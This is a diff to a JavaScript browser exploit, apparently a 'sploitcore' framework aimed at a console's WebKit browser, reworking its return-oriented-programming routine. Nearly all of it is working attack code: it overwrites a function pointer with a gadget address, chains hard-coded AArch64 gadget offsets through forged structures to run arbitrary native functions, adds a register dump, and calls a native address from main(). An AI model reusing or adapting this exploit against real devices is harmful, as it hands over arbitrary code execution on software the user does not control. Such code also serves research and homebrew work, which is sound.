@@ -252,6 +252,8 @@ sploitcore.prototype.read8 = function(addr, offset) {
 sploitcore.prototype.write8 = function(val, addr, offset) {
 	if(arguments.length == 2)
 		offset = 0;
+    if (typeof(val) == 'number') 
+        val = [val, 0];
 	this.write4(val[0], addr, offset);
 	this.write4(val[1], addr, offset + 1);
 };
@@ -417,160 +419,228 @@ sploitcore.prototype.free = function(addr) {
 	this.allocated[addr] = 0;
 };
 
-sploitcore.prototype.call = function(funcptr, args, registers) {
-	if (typeof(funcptr) == 'number') {
-		funcptr = add2(this.mainaddr, funcptr);
-	}
-	if (arguments.length == 2) {
-		registers = [];
-	} else if (arguments.length == 1) {
-		registers = [];
-		args = [];
-	} 
-	var sp = this.getSP();
+sploitcore.prototype.call = function(funcptr, args, registers, dump_regs) {
+    if (typeof(funcptr) == 'number') {
+        funcptr = add2(this.mainaddr, funcptr);
+    }
+    if (arguments.length == 3) {
+        dump_regs = false;
+    } else if (arguments.length == 2) {
+        dump_regs = false;
+        registers = [];
+    } else if (arguments.length == 1) {
+        dump_regs = false;
+        registers = [];
+        args = [];
+    } 
+    var sp = this.getSP();
 
-	dlog('Starting holy rop');
-	var jaddr = this.mref(0x39FEEC); // First gadget addr
-	dlog('New jump at ' + paddr(jaddr));
-	dlog('Assigning function pointer');
+    dlog('Starting holy rop');
+    var jaddr = this.mref(0x39FEEC); // First gadget addr
+    dlog('New jump at ' + paddr(jaddr));
+    dlog('Assigning function pointer');
 
-	dlog('Function object at ' + paddr(this.funcaddr));
-	var curptr = this.read8(this.funcaddr, 8);
-	this.write8(jaddr, this.funcaddr, 8);
-	dlog('Patched function address from ' + paddr(curptr) + ' to ' + paddr(this.read8(this.funcaddr, 8)));
+    dlog('Function object at ' + paddr(this.funcaddr));
+    var curptr = this.read8(this.funcaddr, 8);
+    this.write8(jaddr, this.funcaddr, 8);
+    dlog('Patched function address from ' + paddr(curptr) + ' to ' + paddr(this.read8(this.funcaddr, 8)));
 
-	dlog('Setting up structs');
+    dlog('Setting up structs');
 
-	var fixed = this.mref(0x91F320);
-	var saved = new Uint32Array(12);
-	for(var i = 0; i < saved.length; ++i)
-		saved[i] = this.read4(fixed, i);
+    var fixed = this.mref(0x91F320);
+    var saved = new Uint32Array(12);
+    for(var i = 0; i < saved.length; ++i)
+        saved[i] = this.read4(fixed, i);
 
-	// Begin Gadgets
-	var gadg2 = this.mref(0x4967F0);
-	var gadg3 = this.mref(0x433EB4);
-	var gadg4 = this.mref(0x1A1C98);
-	var gadg5 = this.mref(0x3C2314);
-	var returngadg = this.mref(0x181E9C);
+    // Begin Gadgets
+    var load_x0_w1_x2_x9_blr_x9 = this.mref(0x4967F0);
+    var load_x2_x30_mov_sp_into_x2_br_x30 = this.mref(0x433EB4);
+    var load_x2_x8_br_x2 = this.mref(0x1A1C98);
+    var load_x30_from_sp_br_x2 = this.mref(0x3C2314);
+    var returngadg = this.mref(0x181E9C);
 
-	var savegadg = this.mref(0x4336B0);
-	var loadgadg = this.mref(0x433620);
-	var loadgadg_stage2 = this.mref(0x3A8688);
+    var savegadg = this.mref(0x4336B0);
+    var loadgadg = this.mref(0x433620);
+    var loadgadg_stage2 = this.mref(0x3A8688);
 
-	var ropgadg2 = this.mref(0x582AE8);
-	var ropgadg3 = this.mref(0x182444);
-	var ropgadg4 = this.mref(0x3A278C);
-	// End Gadgets
+    var load_x19 = this.mref(0x6C3E4);
+    var str_x20 = this.mref(0x117330);
+    var str_x8 = this.mref(0x453530);
+    var load_and_str_x8 = this.mref(0x474A98);
+    var str_x1 = this.mref(0x581B8C);
+    var mov_x2_into_x1 = this.mref(0x1A0454);
+    var str_x0 = this.mref(0xFDF4C);
+    var str_x9 = this.mref(0x1F8280);
+    var mov_x19_into_x0 = this.mref(0x12CC68);
 
-	var context_load_struct = this.malloc(0x200);
-	var block_struct_1 = this.malloc(0x200);
-	var block_struct_2 = this.malloc(0x200);
-	var savearea = this.malloc(0x400);
-	var loadarea = this.malloc(0x400);
+    // End Gadgets
 
-	this.write8(context_load_struct, fixed, 0x00 >> 2);
-	this.write8(gadg2, fixed, 0x08 >> 2);
-	this.write8(gadg3, fixed, 0x10 >> 2);
-	this.write8(gadg2, fixed, 0x18 >> 2);
-	this.write8(block_struct_1, fixed, 0x28 >> 2);
+    var context_load_struct = this.malloc(0x200);
+    var block_struct_1 = this.malloc(0x200);
+    var block_struct_2 = this.malloc(0x200);
+    var block_struct_3 = this.malloc(0x200);
+    var savearea = this.malloc(0x400);
+    var loadarea = this.malloc(0x400);
+    var dumparea = this.malloc(0x400);
 
-	sp = add2(sp, -0x8030);
-	this.write8(gadg4, context_load_struct, 0x58 >> 2);
-	this.write8(sp, context_load_struct, 0x68 >> 2);
-	this.write8(returngadg, context_load_struct, 0x158 >> 2);
-	this.write8(add2(sp, 0x8030), context_load_struct, 0x168 >> 2);
+    this.write8(context_load_struct, fixed, 0x00 >> 2);
+    this.write8(load_x0_w1_x2_x9_blr_x9, fixed, 0x08 >> 2);
+    this.write8(load_x2_x30_mov_sp_into_x2_br_x30, fixed, 0x10 >> 2);
+    this.write8(load_x0_w1_x2_x9_blr_x9, fixed, 0x18 >> 2);
+    this.write8(block_struct_1, fixed, 0x28 >> 2);
 
-	this.write8(savearea, block_struct_1, 0x0 >> 2);
-	this.write8(gadg5, block_struct_1, 0x10 >> 2);
-	this.write8(gadg2, block_struct_1, 0x18 >> 2);
-	this.write8(block_struct_2, block_struct_1, 0x28 >> 2);
-	this.write8(savegadg, block_struct_1, 0x38 >> 2);
+    sp = add2(sp, -0x8030);
+    this.write8(load_x2_x8_br_x2, context_load_struct, 0x58 >> 2);
+    this.write8(sp, context_load_struct, 0x68 >> 2);
+    this.write8(returngadg, context_load_struct, 0x158 >> 2);
+    this.write8(add2(sp, 0x8030), context_load_struct, 0x168 >> 2);
 
-	this.write8(gadg4, sp, 0x28 >> 2);
+    this.write8(savearea, block_struct_1, 0x0 >> 2);
+    this.write8(load_x30_from_sp_br_x2, block_struct_1, 0x10 >> 2);
+    this.write8(load_x0_w1_x2_x9_blr_x9, block_struct_1, 0x18 >> 2);
+    this.write8(block_struct_2, block_struct_1, 0x28 >> 2);
+    this.write8(savegadg, block_struct_1, 0x38 >> 2);
 
-	sp = add2(sp, 0x30);
+    this.write8(load_x2_x8_br_x2, sp, 0x28 >> 2);
 
-	this.write8(loadarea, block_struct_2, 0x00 >> 2);
-	this.write8(loadgadg, block_struct_2, 0x10 >> 2);
+    sp = add2(sp, 0x30);
 
-	this.write8(sp, loadarea, 0xF8 >> 2); // Can write an arbitrary stack ptr here, for argument passing
-	this.write8(loadgadg_stage2, loadarea, 0x100 >> 2); // Return from load to load-stage2
-	this.write8(funcptr, loadarea, 0x00 >> 2); 
+    this.write8(loadarea, block_struct_2, 0x00 >> 2);
+    this.write8(loadgadg, block_struct_2, 0x10 >> 2);
 
-	// Write registers for native code.
-	if (registers.length > 9) {
-		for (var i = 9; i < 30 && i < registers.length; i++) {
-			this.write8(registers[i], loadarea, (8 * i) >> 2);
-		}
-	}
+    this.write8(sp, loadarea, 0xF8 >> 2); // Can write an arbitrary stack ptr here, for argument passing
+    this.write8(loadgadg_stage2, loadarea, 0x100 >> 2); // Return from load to load-stage2
+    this.write8(funcptr, loadarea, 0x00 >> 2); 
 
-	// TODO: Loading in Q0-Q7 from SP[0:0x80] here, if we want it.
+    // Write registers for native code.
+    if (registers.length > 9) {
+        for (var i = 9; i < 30 && i < registers.length; i++) {
+            this.write8(registers[i], loadarea, (8 * i) >> 2);
+        }
+    }
 
-	if (registers.length > 0) {
-		for (var i = 0; i <= 8 && i < registers.length; i++) {
-			this.write8(registers[i], sp, (0x80 + 8 * i) >> 2);
-		}
+    // TODO: Loading in Q0-Q7 from SP[0:0x80] here, if we want it.
 
-		if (registers.length > 19) {
-			this.write8(registers[19], sp, 0xC8 >> 2);
-		}
+    if (registers.length > 0) {
+        for (var i = 0; i <= 8 && i < registers.length; i++) {
+            this.write8(registers[i], sp, (0x80 + 8 * i) >> 2);
+        }
 
-		if (registers.length > 29) {
-			this.write8(registers[29], sp, 0xD0 >> 2);
-		}
-	}
+        if (registers.length > 19) {
+            this.write8(registers[19], sp, 0xC8 >> 2);
+        }
 
-	if (args.length > 0) {
-		for (var i = 0; i < args.length && i < 8; i++) {
-			this.write8(args[i], sp, (0x80 + 8 * i) >> 2)
-		}
-	}
+        if (registers.length > 29) {
+            this.write8(registers[29], sp, 0xD0 >> 2);
+        }
+    }
 
-	this.write8(ropgadg2, sp, 0xD8 >> 2); // Set Link Register for our arbitrary function to point to cleanup rop
+    if (args.length > 0) {
+        for (var i = 0; i < args.length && i < 8; i++) {
+            this.write8(args[i], sp, (0x80 + 8 * i) >> 2)
+        }
+    }
 
-	// Stack arguments would be bottomed-out at sp + 0xE0...
-	// TODO: Stack arguments support. Would just need to figure out how much space they take up
-	// and write ROP above them. Note: the user would have to call code that actually used
-	// that many stack arguments, or shit'd crash.
+    this.write8(load_x19, sp, 0xD8 >> 2); // Set Link Register for our arbitrary function to point to cleanup rop
 
-	this.write8(add2(savearea, 0xB8), sp, 0xE8 >> 2);
-	this.write8(ropgadg3, sp, 0xF8 >> 2);
-	this.write8(ropgadg4, sp, 0x118 >> 2);
-	this.write8(add2(sp, 0x8000), sp, 0x128 >> 2);
-	this.write8(ropgadg2, sp, 0x138 >> 2);
-	this.write8(add2(savearea, 0xF0), sp, 0x148 >> 2);
-	this.write8(ropgadg3, sp, 0x158 >> 2);
-	this.write8(ropgadg4, sp, 0x178 >> 2);
-	this.write8(returngadg, sp, 0x188 >> 2);
-	this.write8(ropgadg2, sp, 0x198 >> 2);
-	this.write8(add2(savearea, 0xF8), sp, 0x1A8 >> 2);
-	this.write8(ropgadg3, sp, 0x1B8 >> 2);
-	this.write8(ropgadg4, sp, 0x1D8 >> 2);
-	this.write8(savearea, sp, 0x1E8 >> 2);
-	this.write8(loadgadg, sp, 0x1F8 >> 2);
+    // Stack arguments would be bottomed-out at sp + 0xE0...
+    // TODO: Stack arguments support. Would just need to figure out how much space they take up
+    // and write ROP above them. Note: the user would have to call code that actually used
+    // that many stack arguments, or shit'd crash.
 
-	sp = add2(sp, 0x8000);
+    // ROP currently begins at sp + 0xE0
 
-	dlog('Assigned.  Jumping.');
-	var ret = this.getAddrDestroy(this.func.apply(0x101));
-	dlog('Jumped back.');
+    this.write8(add2(dumparea, 0x300 - 0x10), sp, (0xE0 + 0x28) >> 2); // Load X19 = dumparea + 0x300 - 0x10
+    this.write8(str_x20, sp, (0xE0 + 0x38) >> 2);                      // Load LR with str_x20
+    this.write8(add2(dumparea, 0x308), sp, (0x120 + 0x8) >> 2);        // Load X19 = dumparea + 0x308
+    this.write8(str_x8, sp, (0x120 + 0x18) >> 2);                      // Load LR with str_x8
+    this.write8(add2(dumparea, 0x310 - 0x18), sp, (0x140 + 0x0) >> 2); // Load X19 = dumparea + 0x310 - 0x18
+    this.write8(str_x1, sp, (0x140 + 0x18) >> 2);                      // Load LR with str_x1
+    this.write8(add2(dumparea, 0x3F8), sp, (0x160 + 0x0) >> 2);        // Load X20 with scratch space
+    this.write8(add2(dumparea, 0x380), sp, (0x160 + 0x8) >> 2);        // Load X19 = dumparea + 0x380
+    this.write8(str_x1, dumparea, 0x380 >> 2);                         // Write str_x1 to dumparea + 0x380
+    this.write8(load_and_str_x8, sp, (0x160 + 0x18) >> 2);             // Load LR with Load, STR X8
+    this.write8(add2(dumparea, 0x318 - 0x18), sp, (0x180 + 0x8) >> 2); // Load X19 = dumparea + 0x318 - 0x18
+    this.write8(mov_x2_into_x1, sp, (0x180 + 0x18) >> 2);              // Load LR with mov x1, x2
+    this.write8(add2(dumparea, 0x3F8), sp, (0x1A0 + 0x0) >> 2);        // Load X20 with scratch space
+    this.write8(add2(savearea, 0xC0), sp, (0x1A0 + 0x8) >> 2);         // Load X19 = savearea + 0xC0 (saved X24)
+    this.write8(str_x0, sp, (0x1A0 + 0x18) >> 2);                      // Load LR with str x0
+    this.write8(add2(dumparea, 0x388), sp, (0x1C0 + 0x0) >> 2);        // Load X19 = dumparea + 0x388
+    this.write8(add2(dumparea, 0x320), dumparea, 0x388 >> 2);          // Write dumparea + 0x320 to dumparea + 0x388
+    this.write8(load_and_str_x8, sp, (0x1C0 + 0x18) >> 2);             // Load LR with load, STR X8
+    this.write8(add2(dumparea, 0x3F8), sp, (0x1E0 + 0x0) >> 2);        // Load X20 with scratch space
+    this.write8(add2(dumparea, 0x328 - 0x58), sp, (0x1E0 + 0x8) >> 2); // Load X19 = dumparea + 0x328 - 0x58
+    this.write8(str_x9, sp, (0x1E0 + 0x18) >> 2);                      // Load LR with STR X9
+    this.write8(add2(dumparea, 0x390), sp, (0x200 + 0x0) >> 2);        // Load X19 with dumparea + 0x390
+    this.write8(block_struct_3, dumparea, 0x390 >> 2);                 // Write block struct 3 to dumparea + 0x390
+    this.write8(load_and_str_x8, sp, (0x200 + 0x18) >> 2);             // Load LR with load, STR X8
+    this.write8(load_x0_w1_x2_x9_blr_x9, sp, (0x220 + 0x18) >> 2);     // Load LR with gadget 2
 
-	this.write8(curptr, this.funcaddr, 8);
+    // Block Struct 3
+    this.write8(dumparea, block_struct_3, 0x00 >> 2);
+    this.write8(load_x30_from_sp_br_x2, block_struct_3, 0x10 >> 2);
+    this.write8(savegadg, block_struct_3, 0x38 >> 2);
 
-	dlog('Restored original function pointer.');
+    this.write8(add2(str_x20, 0x4), sp, (0x240 + 0x28) >> 2);          // Load LR with LD X19, X20, X30
+    this.write8(add2(savearea, 0xF8), sp, (0x270 + 0x0) >> 2);         // Load X20 with savearea + 0xF8 (saved SP)
+    this.write8(add2(dumparea, 0x398), sp, (0x270 + 0x8) >> 2);        // Load X19 with dumparea + 0x398
+    this.write8(add2(sp, 0x8000), dumparea, 0x398 >> 2);               // Write SP to dumparea + 0x38
+    this.write8(load_and_str_x8, sp, (0x270 + 0x18) >> 2);             // Load X30 with LD, STR X8
+    this.write8(add2(savearea, 0x100), sp, (0x290 + 0x0) >> 2);        // Load X20 with savearea + 0x100 (saved LR)
+    this.write8(add2(dumparea, 0x3A0), sp, (0x290 + 0x8) >> 2);        // Load X19 with dumparea + 0x3A0
+    this.write8(returngadg, dumparea, 0x3A0 >> 2);                     // Write return gadget to dumparea + 0x3A0
+    this.write8(load_and_str_x8, sp, (0x290 + 0x18) >> 2);             // Load X30 with LD, STR X8
+    this.write8(savearea, sp, (0x2B0 + 0x8) >> 2);                     // Load X19 with savearea
+    this.write8(mov_x19_into_x0, sp, (0x2B0 + 0x18) >> 2);             // Load X30 with mov x0, x19.
+    this.write8(loadgadg, sp, (0x2D0 + 0x18) >> 2);                    // Load X30 with context load
 
-	for(var i = 0; i < saved.length; ++i)
-		this.write4(saved[i], fixed, i);
-	dlog('Restored data page.');
+    sp = add2(sp, 0x8000);
 
-	dlog('Native code at ' + paddr(funcptr) + ' returned: ' + paddr(ret));
+    dlog('Assigned.  Jumping.');
+    var ret = this.getAddrDestroy(this.func.apply(0x101));
+    dlog('Jumped back.');
 
-	this.free(context_load_struct);
-	this.free(block_struct_1);
-	this.free(block_struct_2);
-	this.free(savearea);
-	this.free(loadarea);
-	return ret;
+    this.write8(curptr, this.funcaddr, 8);
+
+    dlog('Restored original function pointer.');
+
+    if (dump_regs) {
+        log('Register dump post-code execution:');
+        for (var i = 0; i <= 30; i++) {
+            if (i == 0) {
+                log('X0: ' + paddr(ret));
+            } else if (i == 1) {
+                log('X1: ' + paddr(this.read8(dumparea, 0x310 >> 2)));
+            } else if (i == 2) {
+                log('X2: ' + paddr(this.read8(dumparea, 0x318 >> 2)));
+            } else if (i == 8) {
+                log('X8: ' + paddr(this.read8(dumparea, 0x308 >> 2)));
+            } else if (i == 9) {
+                log('X9: ' + paddr(this.read8(dumparea, 0x328 >> 2)));
+            } else if (i == 20) {
+                log('X20: ' + paddr(this.read8(dumparea, 0x300 >> 2)));
+            } else {
+                log('X' + i + ': ' + paddr(this.read8(dumparea, (8 * i) >> 2)));
+            }
+        }
+    }
+
+
+    for(var i = 0; i < saved.length; ++i)
+        this.write4(saved[i], fixed, i);
+    dlog('Restored data page.');
+
+    dlog('Native code at ' + paddr(funcptr) + ' returned: ' + paddr(ret));
+
+
+    this.free(context_load_struct);
+    this.free(block_struct_1);
+    this.free(block_struct_2);
+    this.free(block_struct_3);
+    this.free(savearea);
+    this.free(loadarea);
+    this.free(dumparea);
+    return ret;
 };
 
 sploitcore.prototype.querymem = function(addr, raw) {
@@ -769,4 +839,7 @@ function main() {
 	//sc.dumpFile('shareddata:/dll/libfont.nro');
 	//sc.dumpFile('shareddata:/dll/webkit_wkc.nro');
 	//sc.dumpFile('data:/sound/cruiser.bfsar');
+
+	var ret = 0x3F99DC;
+    sc.call(ret, [256,257,258,259,260,261,262,263], [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30], true);
 }
